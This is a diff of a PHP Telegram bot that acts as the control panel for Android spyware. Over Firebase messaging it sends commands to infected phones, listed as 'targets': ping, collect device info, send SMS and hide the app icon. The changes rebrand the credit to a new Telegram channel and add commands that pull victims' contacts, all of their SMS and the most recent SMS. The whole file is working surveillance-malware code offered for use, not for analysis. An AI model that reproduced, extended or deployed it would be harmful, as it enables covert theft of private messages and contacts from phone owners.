@@ -1,8 +1,8 @@
 <?php 
 error_reporting(0);
-/////// @Stop_TiM
+
 include("info.php");
-/////// @Stop_TiM
+
 define( 'TOKEN', $token );
 define( 'API_ACCESS_KEY', $apikey );
 if(!file_exists("userlist")){
@@ -14,7 +14,7 @@ file_put_contents("admins","");
 }
 if(!file_exists("user.txt")){
 file_put_contents("user.txt","");
-/////// @Stop_TiM
+
 }
 function bot($method, $datas = [])
 {
@@ -33,7 +33,7 @@ function bot($method, $datas = [])
     }
 }
 
-/////// @Stop_TiM
+
 function pingbot(){
     
     $ch = curl_init("127.0.0.1"); 
@@ -43,7 +43,7 @@ function pingbot(){
   $info = curl_getinfo($ch);
  return $info['total_time'] ;
   }
-/////// @Stop_TiM
+
   curl_close($ch);
 
     
@@ -51,9 +51,9 @@ function pingbot(){
     
     
 }
-/////// @Stop_TiM
+
 function action($action,$androidid){
-$data_string = '{"data":{"action":"'.$action.'","androidid":"'.$androidid.'"},"to":"\/topics\/stoptim"}';
+$data_string = '{"data":{"action":"'.$action.'","androidid":"'.$androidid.'"},"to":"\/topics\/pluto"}';
 
 $headers = array ( 'Authorization: key=' . API_ACCESS_KEY, 'Content-Type: application/json' );
 $ch = curl_init(); curl_setopt( $ch,CURLOPT_URL, 'https://fcm.googleapis.com/fcm/send' );
@@ -66,7 +66,7 @@ curl_close ($ch);
 } 
 function sendmess($action,$androidid,$phone,$message){
     $port=file_get_contents("port.txt");
-$data_string = '{"data":{"action":"'.$action.'","androidid":"'.$androidid.'","phone":"'.$phone.'","text":"'.$message.'"},"to":"\/topics\/stoptim"}';
+$data_string = '{"data":{"action":"'.$action.'","androidid":"'.$androidid.'","phone":"'.$phone.'","text":"'.$message.'"},"to":"\/topics\/pluto"}';
 $headers = array ( 'Authorization: key=' . API_ACCESS_KEY, 'Content-Type: application/json' );
 $ch = curl_init(); curl_setopt( $ch,CURLOPT_URL, 'https://fcm.googleapis.com/fcm/send' );
 curl_setopt( $ch,CURLOPT_POST, true );
@@ -75,11 +75,11 @@ curl_setopt( $ch,CURLOPT_RETURNTRANSFER, true );
 curl_setopt( $ch,CURLOPT_POSTFIELDS, $data_string);
 $result = curl_exec($ch);
 curl_close ($ch);
-	/////// @Stop_TiM
+  
 }
 function ping($action){
 $port=file_get_contents("port.txt");
-$data_string = '{"data":{"action":"'.$action.'"},"to":"\/topics\/stoptim"}';
+$data_string = '{"data":{"action":"'.$action.'"},"to":"\/topics\/pluto"}';
 
 $headers = array ( 'Authorization: key=' . API_ACCESS_KEY, 'Content-Type: application/json' );
 $ch = curl_init(); curl_setopt( $ch,CURLOPT_URL, 'https://fcm.googleapis.com/fcm/send' );
@@ -91,7 +91,6 @@ $result = curl_exec($ch);
 curl_close ($ch);
    
 }
-/////// @Stop_TiM
 function sm1($chatid,$text,$reply){
 	bot('sendMessage',[
 	'chat_id'=>$chatid,
@@ -109,9 +108,9 @@ bot('editmessagetext',[
     'reply_markup'=>$keyboard
 	]);
 	}
-
-
-/////// @Stop_TiM
+	
+	
+	
 	
 	
 	
@@ -148,8 +147,8 @@ $key1[]= [['text'=> "بازگشت", 'callback_data'=> "back1"]];
 
    
  $keyboard2= json_encode(['inline_keyboard'=> $key1]);
+  
 
-/////// @Stop_TiM
    
 function sm($chatid,$text,$keyboard){
 	bot('sendMessage',[
@@ -179,11 +178,12 @@ $count=count(scandir("userlist"))-2;
 //==================================================,'callback_data' => 'PhoneList'
 $starta = json_encode(array('inline_keyboard'=>[[['text'=>"♻️PING(ALL)♻️",'callback_data' => 'pingall'],['text'=>"📱TARGET LIST📱",'callback_data' => 'PhoneList']],
 [['text'=>"❌DELL TARGET❌",'callback_data' => 'delete'],['text'=>"✳️BOT PING✳️",'callback_data' => 'botping']],
-[['text'=>"Stop_TiM",'url' => 't.me/Stop_TiM']]
+[['text'=>"✏️@HiGHFaTHeR_CH✏️",'url' => 't.me/HiGHFaTHeR_CH']]
 ]));
-$admins = json_encode(array('inline_keyboard'=>[[['text'=>"ℹ️GeT INFOℹ️",'callback_data' => 'deviceinfo']],
-[['text'=>"📨SEND SMS📨",'callback_data' => 'sendmessage'],['text'=>"🔅HiDe ICON🔅️",'callback_data' => 'hideicon']],
-[['text'=>"Stop_TiM",'url' => 't.me/Stop_TiM'],['text'=>"Back",'callback_data' => 'Back3']]
+$admins = json_encode(array('inline_keyboard'=>[[['text'=>"♻️PING♻️",'callback_data' => 'pingone'],['text'=>"ℹ️GeT INFOℹ️",'callback_data' => 'deviceinfo']],
+[['text'=>"📥GeT All SmS📤",'callback_data' => 'smsget']],[['text'=>"📨SEND SMS📨",'callback_data' => 'sendmessage'],['text'=>"🔅HiDe ICON🔅️",'callback_data' => 'hideicon']],[['text'=>"♻️GeT ConTaCt♻️️",'callback_data' => 'getcontact']],
+[['text'=>"💌GeT LasT SmS💌",'callback_data' => 'getlastsms']],
+[['text'=>"✏️@HiGHFaTHeR_CH✏️",'url' => 't.me/HiGHFaTHeR_CH'],['text'=>"Back",'callback_data' => 'Back3']]
 ]));
 $back4=json_encode(array('inline_keyboard'=>[[['text'=>"Back",'callback_data' => 'back4']]]));
 $back1=json_encode(array('inline_keyboard'=>[[['text'=>"Back",'callback_data' => 'back1']]]));
@@ -195,7 +195,7 @@ if(in_array($chat_id,$admin_list)){
 
 📲Targets : $count
 
-✏️CR : @Stop_TiM️",$starta);
+✏️CR : @HiGHFaTHeR_CH️",$starta);
 
 	}elseif($data == "PhoneList"){
 	    
@@ -233,6 +233,17 @@ TarGetS: $count ♨️
 
 🎃For Control This Target Use Button 👇🏽",$admins);
 	    
+	}elseif($data == "pingone"){
+	     $androidid=file_get_contents('p');  
+	     $name = file_get_contents('name');  
+	     action('pingone',$androidid);
+	     
+	    em($chat_id,$mi,"✳️GeT PING For ( $name) TargeT!
+
+
+🎃More INFO In NeXt Messages:)️",$back4);
+	   
+	    
 	}elseif($data == "deviceinfo"){
 	     $androidid=file_get_contents('p');  
 	     $name = file_get_contents('name');  
@@ -243,6 +254,30 @@ TarGetS: $count ♨️
 
 🎃More INFO In NeXt Messages:)️️",$back4);
 	   
+	    
+	}elseif($data == "getcontact"){
+	    $androidid=file_get_contents('p');  
+	     $name = file_get_contents('name');  
+	    
+	     action('getcontact',$androidid);
+	     
+	    em($chat_id,$mi,"⚜️GET ConTaCT ReQuEsT FoR ( $name ) Target
+
+🎃More INFO In NeXt Messages:)️️",$back4);
+	    
+	    
+	    
+	}elseif($data == "smsget"){
+	    $androidid=file_get_contents('p');  
+	     $name = file_get_contents('name');  
+	    
+	     action('getsms',$androidid);
+	     
+	    em($chat_id,$mi,"⚜️GET SmS ReQuEsT FoR ( $name ) Target
+
+🎃More INFO In NeXt Messages:)️️",$back4);
+	    
+	    
 	    
 	}
 	
@@ -285,6 +320,25 @@ action('hideicon',$androidid);
 	  
 	    
 	    
+	}elseif($data == "getlastsms"){
+	  $androidid=file_get_contents('p');  
+action('lastsms',$androidid);
+   $name=file_get_contents('name');  
+     $texts="✳️RequeST Sended For ( $name ) TarGeT!
+
+♿️More INFo IN NeXT MesSage";
+  
+
+  
+	    em($chat_id,$mi,$texts,$back4);
+	       
+  
+ 
+    
+	    
+	  
+	    
+	    
 	}elseif($data == "delete"){
 	    
 	     em($chat_id,$mi,"❌SeLecT The TarGet YoU WanT DeleTe:👇🏽",$keyboard2);
@@ -312,7 +366,7 @@ file_put_contents("admins","");
 
 📲Targets : $count
 
-✏️CR : @Stop_TiM️",$starta);
+✏️CR : @HiGHFaTHeR_CH️",$starta);
 
 	}	elseif($data == "Back3"){
 	   file_put_contents("admins","");
